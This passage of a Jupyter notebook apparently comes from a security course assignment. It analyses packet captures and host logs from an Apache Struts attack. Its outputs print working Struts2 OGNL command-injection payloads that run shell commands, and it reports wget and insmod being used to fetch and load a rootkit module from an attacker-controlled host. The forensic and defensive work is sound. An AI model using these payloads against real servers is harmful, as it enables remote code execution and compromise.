      "(\"%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\", 810)\n",
      "\n",
      "\n",
      "(\"%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='ls').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\", 806)\n",
      "\n",
      "\n",
      "('application/x-www-form-urlencoded', 33)\n",
      "\n",
      "\n"
     ]
    }
   ],
   "source": [
    "# 2.a\n",
    "\n",
    "content_type_headers = set() # it looks like there are repetitions. we want to capture only unique items\n",
    "\n",
    "for pkt in http:\n",
    "    if len(pkt.layers) < 3:\n",
    "        continue\n",
    "    try: \n",
    "        if len(pkt.http.content_type)>0 and pkt.ip.dst == first_vulnerable_server_ip:\n",
    "            content_type_headers.add((pkt.http.content_type,len(pkt.http.content_type)))\n",
    "    except Exception as e:\n",
    "        continue\n",
    "    \n",
    "print('header: ', 'length: \\n\\n')\n",
    "\n",
    "for i in content_type_headers:\n",
    "    print(i)\n",
    "    print('\\n')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Command in attack packet 455 : ['cat']\n",
      "Command in attack packet 471 : ['cat']\n",
      "Command in attack packet 487 : ['cat']\n",
      "Command in attack packet 503 : ['cat']\n",
      "Command in attack packet 519 : ['ls']\n",
      "Command in attack packet 529 : ['whoami', 'ls']\n",
      "Command in attack packet 539 : ['wget', 'ls']\n",
      "Command in attack packet 551 : ['wget', 'ls']\n",
      "Command in attack packet 577 : ['ls', 'insmod']\n",
      "Command in attack packet 587 : ['ls', 'insmod']\n",
      "Command in attack packet 597 : ['ls', 'insmod']\n"
     ]
    }
   ],
   "source": [
    "# 2.b\n",
    "from collections import defaultdict\n",
    "unix_commands = ['whoami','wget','ls','cat','cd','insmod','ssh','lsmod']\n",
    "\n",
    "command_in_attack = defaultdict(list)\n",
    "\n",
    "for i,pkt in enumerate(http):\n",
    "    if len(pkt.layers) < 3:\n",
    "        continue\n",
    "    try: \n",
    "        for j,cmd in enumerate(unix_commands):\n",
    "            if cmd in pkt.http.content_type:\n",
    "                command_in_attack[i].append(cmd)\n",
    "    except Exception as e:\n",
    "        continue\n",
    "        \n",
    "for k,v in command_in_attack.items():\n",
    "    print('Command in attack packet', k,':', v)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### host logs analysis"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      " Kernel modules added/removed: ['rk' 'ipt_MASQUERADE' 'nf_nat_masquerade_ipv4' 'nf_conntrack_netlink'\n",
      " 'nfnetlink' 'xfrm_user' 'xfrm_algo' 'iptable_nat' 'nf_conntrack_ipv4'\n",
      " 'nf_defrag_ipv4' 'nf_nat_ipv4' 'xt_addrtype' 'iptable_filter' 'ip_tables'\n",
      " 'xt_conntrack' 'x_tables' 'nf_nat' 'nf_conntrack' 'br_netfilter' 'bridge'\n",
      " 'stp' 'llc' 'overlay' 'ppdev' 'intel_powerclamp' 'crct10dif_pclmul'\n",
      " 'crc32_pclmul' 'ghash_clmulni_intel' 'aesni_intel' 'aes_x86_64' 'lrw'\n",
      " 'vboxvideo' 'gf128mul' 'glue_helper' 'ablk_helper' 'cryptd' 'ttm'\n",
      " 'drm_kms_helper' 'snd_intel8x0' 'snd_ac97_codec' 'ac97_bus' 'input_leds'\n",
      " 'joydev' 'serio_raw' 'snd_pcm' 'drm' 'fb_sys_fops' 'snd_timer'\n",
      " 'syscopyarea' 'sysfillrect' 'i2c_piix4' 'snd' 'sysimgblt' 'soundcore'\n",
      " 'vboxguest' '8250_fintek' 'parport_pc' 'parport' 'mac_hid' 'autofs4'\n",
      " 'hid_generic' 'usbhid' 'hid' 'psmouse' 'ahci' 'libahci' 'e1000'\n",
      " 'pata_acpi' 'fjes' 'video' 'xt_nat' 'xt_tcpudp' 'veth' 'floppy' 'xor'\n",
      " 'raid6_pq' 'ufs' 'qnx4' 'hfsplus' 'hfs' 'minix' 'ntfs' 'msdos' 'jfs'\n",
      " 'xfs' 'libcrc32c' 'btrfs' 'nfnetlink_queue' 'nfnetlink_log' 'bluetooth']\n"
     ]
    }
   ],
   "source": [
    "kernel_module_mask = df_oslogs.name == 'kernel_module'\n",
    "kernel_module_modified = df_oslogs.loc[kernel_module_mask,'columns.name'].unique()\n",
    "print(' Kernel modules added/removed:' , kernel_module_modified)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "wget is used to download and insmod is used to add new kernel modules of type *.ko\n",
      "We observe that rk.ko was dowloaded and added to the vulnerable system\n"
     ]
    },
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>name</th>\n",
       "      <th>hostIdentifier</th>\n",
       "      <th>calendarTime</th>\n",
       "      <th>unixTime</th>\n",
       "      <th>epoch</th>\n",
       "      <th>counter</th>\n",
       "      <th>action</th>\n",
       "      <th>decorations.host_uuid</th>\n",
       "      <th>decorations.username</th>\n",
       "      <th>columns.name</th>\n",
       "      <th>...</th>\n",
       "      <th>columns.md5</th>\n",
       "      <th>columns.mode</th>\n",
       "      <th>columns.mtime</th>\n",
       "      <th>columns.sha1</th>\n",
       "      <th>columns.sha256</th>\n",
       "      <th>columns.size</th>\n",
       "      <th>columns.target_path</th>\n",
       "      <th>columns.time</th>\n",
       "      <th>columns.transaction_id</th>\n",
       "      <th>columns.uid</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>42</th>\n",
       "      <td>kernel_module</td>\n",
       "      <td>ubuntu</td>\n",
       "      <td>Tue Feb  6 00:34:09 2018 UTC</td>\n",
       "      <td>1517877249</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>added</td>\n",
       "      <td>D5882FBF-1D65-4A30-B216-77F664B7D3B0</td>\n",
       "      <td></td>\n",
       "      <td>rk</td>\n",
       "      <td>...</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>113</th>\n",
       "      <td>kernel_module</td>\n",
       "      <td>ubuntu</td>\n",
       "      <td>Tue Feb  6 00:34:50 2018 UTC</td>\n",
       "      <td>1517877290</td>\n",
       "      <td>0</td>\n",
       "      <td>41</td>\n",
       "      <td>removed</td>\n",
       "      <td>D5882FBF-1D65-4A30-B216-77F664B7D3B0</td>\n",
       "      <td></td>\n",
       "      <td>rk</td>\n",
       "      <td>...</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2882</th>\n",
       "      <td>kernel_module</td>\n",
       "      <td>ubuntu</td>\n",
       "      <td>Mon Mar 19 15:58:54 2018 UTC</td>\n",
       "      <td>1521475134</td>\n",
       "      <td>0</td>\n",
       "      <td>100</td>\n",
       "      <td>added</td>\n",
       "      <td>D5882FBF-1D65-4A30-B216-77F664B7D3B0</td>\n",
       "      <td>root</td>\n",
       "      <td>rk</td>\n",
       "      <td>...</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2883</th>\n",
       "      <td>kernel_module</td>\n",
       "      <td>ubuntu</td>\n",
       "      <td>Mon Mar 19 15:58:58 2018 UTC</td>\n",
       "      <td>1521475138</td>\n",
       "      <td>0</td>\n",
       "      <td>104</td>\n",
       "      <td>removed</td>\n",
       "      <td>D5882FBF-1D65-4A30-B216-77F664B7D3B0</td>\n",
       "      <td>root</td>\n",
       "      <td>rk</td>\n",
       "      <td>...</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>4 rows × 27 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "               name hostIdentifier                  calendarTime    unixTime  \\\n",
       "42    kernel_module         ubuntu  Tue Feb  6 00:34:09 2018 UTC  1517877249   \n",
       "113   kernel_module         ubuntu  Tue Feb  6 00:34:50 2018 UTC  1517877290   \n",
       "2882  kernel_module         ubuntu  Mon Mar 19 15:58:54 2018 UTC  1521475134   \n",
       "2883  kernel_module         ubuntu  Mon Mar 19 15:58:58 2018 UTC  1521475138   \n",
       "\n",
       "     epoch counter   action                 decorations.host_uuid  \\\n",
       "42       0       0    added  D5882FBF-1D65-4A30-B216-77F664B7D3B0   \n",
       "113      0      41  removed  D5882FBF-1D65-4A30-B216-77F664B7D3B0   \n",
       "2882     0     100    added  D5882FBF-1D65-4A30-B216-77F664B7D3B0   \n",
       "2883     0     104  removed  D5882FBF-1D65-4A30-B216-77F664B7D3B0   \n",
       "\n",
       "     decorations.username columns.name  ... columns.md5 columns.mode  \\\n",
       "42                                  rk  ...         NaN          NaN   \n",
       "113                                 rk  ...         NaN          NaN   \n",
       "2882                 root           rk  ...         NaN          NaN   \n",
       "2883                 root           rk  ...         NaN          NaN   \n",
       "\n",
       "     columns.mtime columns.sha1 columns.sha256 columns.size  \\\n",
       "42             NaN          NaN            NaN          NaN   \n",
       "113            NaN          NaN            NaN          NaN   \n",
       "2882           NaN          NaN            NaN          NaN   \n",
       "2883           NaN          NaN            NaN          NaN   \n",
       "\n",
       "     columns.target_path columns.time columns.transaction_id columns.uid  \n",
       "42                   NaN          NaN                    NaN         NaN  \n",
       "113                  NaN          NaN                    NaN         NaN  \n",
       "2882                 NaN          NaN                    NaN         NaN  \n",
       "2883                 NaN          NaN                    NaN         NaN  \n",
       "\n",
       "[4 rows x 27 columns]"
      ]
     },
     "execution_count": 18,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "print('wget is used to download and insmod is used to add new kernel modules of type *.ko')\n",
    "attacker_cont_KM = {'insmod':[], 'wget':[]}\n",
    "\n",
    "for i,pkt in enumerate(http):\n",
    "    try: \n",
    "        for j,cmd in enumerate(['insmod','wget']):\n",
    "            if cmd in pkt.http.content_type:\n",
    "                attacker_cont_KM[cmd].append(pkt.http.content_type)\n",
    "    except Exception as e:\n",
    "        continue\n",
    "## print(attacker_cont_KM['insmod'])    \n",
    "print(\"We observe that rk.ko was dowloaded and added to the vulnerable system\")\n",
    "\n",
    "# verfication\n",
    "df_oslogs[(df_oslogs.name == 'kernel_module') & (df_oslogs['columns.name'] == 'rk') ]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "['/tmp/ssh-UOH7XgvEzl', '/tmp/ssh-5HeCi8vrsT', '/tmp/ssh-LPI0zn9obc', '/tmp/ssh-Zt0dvMz9jJ', '/tmp/ssh-gT0GqBhEgT', '/tmp/ssh-SjdvHQJFt5', '/root/.ssh/id_rsa', '/root/.ssh/id_rsa.pub', '/root/.ssh/known_hosts', '/root/.ssh/.known_hosts.swp', '/root/.ssh/.known_hosts.swpx', '/root/.ssh/4913', '/root/.ssh/known_hosts~']\n",
      "List of host names could be in one of the known_hosts* file\n"
     ]
    }
   ],
   "source": [
    "# filenames are present in .ssh folder. reference: #251 piazza post\n",
    "\n",
    "print([a for a in df_oslogs['columns.target_path'].dropna().unique().tolist() if 'ssh' in a])\n",
    "print('List of host names could be in one of the known_hosts* file')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[]\n",
      "Since we don't see any requests to open the known_hosts file, we can conclude that the attacker wasn't naive\n"
     ]
    }
   ],
   "source": [
    "# traversing http packets to find request to known_hosts file\n",
    "search_phrase = 'known_hosts'\n",
    "ssh_search_pkts = [ ]\n",
    "for i,pkt in enumerate(http):\n",
    "    try: \n",
    "        if search_phrase in pkt.http.content_type:\n",
    "            ssh_search_pkts.append(pkt)\n",
    "    except Exception as e:\n",
    "        continue\n",
    "print(ssh_search_pkts)\n",
    "print(\"Since we don't see any requests to open the known_hosts file, we can conclude that the attacker wasn't naive\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### dns traffic analysis"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "dest_ip ['162.212.156.148' '10.0.2.15' '75.75.75.75']\n",
      "source_ip ['10.0.2.15' '162.212.156.148' '75.75.75.75']\n",
      "vulnerable_server_ip :  172.17.0.2\n",
      "DNS servers: ['162.212.156.148' '10.0.2.15' '75.75.75.75']\n",
      "dns uses port 53\n"
     ]
    }
   ],
   "source": [
    "\"\"\"The attacker-controlled DNS server is behind the same network \\\n",
    "that hosts the kernel module in the HTTP task (Task 1.2)\"\"\"\n",
    "\n",
    "df_dns[(df_dns.dest_port == '53') |(df_dns.source_port == '53')]\n",
    "\n",
    "for c in df_dns.columns[3:5]:\n",
    "    print(c, df_dns[c].unique())\n",
    "    \n",
    "print('vulnerable_server_ip : ', first_vulnerable_server_ip)\n",
    "print('DNS servers:',df_dns.iloc[:,3].unique())\n",
    "print('dns uses port 53')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "['162.212.156.148', '162.212.156.148']\n",
      "We see that attacker downloads files from this DNS server:  162.212.156.148\n",
      "Hence attacker owns that server\n"
     ]
    }
   ],
   "source": [
    "possible_dns = df_dns.iloc[:,3].unique()\n",
    "dns_attacker = []\n",
    "for i,pkt in enumerate(http):\n",
    "    try: \n",
    "        for i,ipadr in enumerate(possible_dns):\n",
    "            if ipadr in pkt.http.content_type:\n",
    "                dns_attacker.append(ipadr)\n",
    "    except Exception as e:\n",
    "        continue\n",
    "print(dns_attacker)\n",
    "print('We see that attacker downloads files from this DNS server: ', dns_attacker[0])\n",
    "print('Hence attacker owns that server')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Requirement already satisfied: seaborn in ./lib/python3.7/site-packages (0.10.0)\r\n",
      "Requirement already satisfied: numpy>=1.13.3 in ./lib/python3.7/site-packages (from seaborn) (1.18.2)\r\n",
      "Requirement already satisfied: scipy>=1.0.1 in ./lib/python3.7/site-packages (from seaborn) (1.4.1)\r\n",
      "Requirement already satisfied: pandas>=0.22.0 in ./lib/python3.7/site-packages (from seaborn) (1.0.3)\r\n",
      "Requirement already satisfied: matplotlib>=2.1.2 in ./lib/python3.7/site-packages (from seaborn) (3.2.1)\r\n",
      "Requirement already satisfied: python-dateutil>=2.6.1 in ./lib/python3.7/site-packages (from pandas>=0.22.0->seaborn) (2.8.1)\r\n",
      "Requirement already satisfied: pytz>=2017.2 in ./lib/python3.7/site-packages (from pandas>=0.22.0->seaborn) (2019.3)\r\n",
      "Requirement already satisfied: cycler>=0.10 in ./lib/python3.7/site-packages (from matplotlib>=2.1.2->seaborn) (0.10.0)\r\n",
      "Requirement already satisfied: pyparsing!=2.0.4,!=2.1.2,!=2.1.6,>=2.0.1 in ./lib/python3.7/site-packages (from matplotlib>=2.1.2->seaborn) (2.4.6)\r\n",
      "Requirement already satisfied: kiwisolver>=1.0.1 in ./lib/python3.7/site-packages (from matplotlib>=2.1.2->seaborn) (1.1.0)\r\n",
      "Requirement already satisfied: six>=1.5 in ./lib/python3.7/site-packages (from python-dateutil>=2.6.1->pandas>=0.22.0->seaborn) (1.14.0)\r\n",
      "Requirement already satisfied: setuptools in ./lib/python3.7/site-packages (from kiwisolver>=1.0.1->matplotlib>=2.1.2->seaborn) (46.1.3)\r\n"
     ]
    }
   ],
   "source": [
    "!pip install seaborn"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 864x720 with 1 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    }
   ],
   "source": [
    "import seaborn as sns\n",
    "\n",
    "legitimate = df_dns[df_dns.dest_ip == '10.0.2.15'].length.tolist()\n",
    "attacker_controlled = df_dns[df_dns.dest_ip == '162.212.156.148'].length.tolist()\n",
    "bins = 30\n",
    "plt.figure(figsize = (12,10))\n",
    "ax = plt.axes()\n",
    "\n",
    "sns.distplot(legitimate,bins = bins,label = 'legitimate')\n",
    "sns.distplot(attacker_controlled,bins = bins,label = 'attacker controlled')\n",
    "\n",
    "\n",
    "# plt.xticks(rotation=90)\n",
    "plt.xlabel('Length')\n",
    "plt.ylabel('PDF')\n",
    "plt.title('Query lengths of packets received by DNS servers')\n",
    "plt.legend()\n",
    "plt.show()\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 864x720 with 1 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    }
   ],
   "source": [
    "legitimate = df_dns[df_dns.source_ip == '10.0.2.15'].length.tolist()\n",
    "attacker_controlled = df_dns[df_dns.source_ip == '162.212.156.148'].length.tolist()\n",
    "bins = 30\n",
    "plt.figure(figsize = (12,10))\n",
    "ax = plt.axes()\n",
    "\n",
    "sns.distplot(legitimate,bins = bins,label = 'legitimate')\n",
    "sns.distplot(attacker_controlled,bins = bins,label = 'attacker controlled')\n",
    "\n",
    "\n",
    "# plt.xticks(rotation=90)\n",
    "plt.xlabel('Length')\n",
    "plt.ylabel('PDF')\n",
    "plt.title('Query lengths of packets sent out of DNS servers')\n",
    "plt.legend()\n",
    "plt.show()\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.6.8"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
